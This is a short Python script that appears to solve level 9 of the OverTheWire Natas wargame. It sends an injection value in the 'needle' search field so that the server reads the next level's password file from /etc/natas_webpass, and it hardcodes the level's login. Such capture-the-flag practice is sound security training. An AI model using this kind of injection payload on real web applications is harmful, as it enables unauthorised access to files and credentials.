#!/usr/bin/env python3

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.post(url, data = { "needle": ". /etc/natas_webpass/natas10 #", "submit": "submit" }, auth = (username, password))
# response = requests.get(url, auth = (username, password))
content = response.text

# print(content)

print(re.findall('<pre>\n(.*)\n</pre>', content)[0])